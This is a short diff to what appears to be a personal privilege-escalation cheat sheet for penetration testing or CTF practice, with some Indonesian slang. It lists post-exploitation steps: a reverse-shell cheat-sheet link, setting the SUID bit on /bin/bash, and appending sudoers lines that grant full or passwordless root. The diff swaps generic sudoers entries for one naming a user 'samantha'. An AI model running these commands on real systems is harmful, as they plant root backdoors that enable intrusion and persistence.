@@ -39,8 +39,7 @@ cat /etc/issue
 11. when u got privesc thing just 
 - http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet or
 - `chmod u+s /bin/bash` as root, bash -p, or 
-- `echo "[username] ALL=(ALL:ALL) ALL" >> /etc/sudoers;`
-- `echo "ALL ALL=(ALL:ALL) ALL" >> /etc/sudoers;` >> Kalo males lol
+- `echo "samantha ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers;`
 
 and on and on and on
 
